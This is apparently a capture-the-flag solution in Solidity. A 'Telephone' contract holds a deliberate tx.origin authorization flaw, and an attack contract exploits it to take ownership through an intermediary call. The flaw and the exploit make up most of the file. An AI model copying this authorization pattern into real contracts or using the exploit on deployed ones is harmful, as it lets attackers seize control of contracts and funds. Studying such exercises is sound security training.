// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Question : The contract to be hacked
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

// Run on Remix, With the contract address when deploying Attack COntract
contract TelephoneAttack {
    Telephone telephoneContract;

    constructor(Telephone _telephone) {
        telephoneContract = Telephone(_telephone);
    }

    function attackT() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
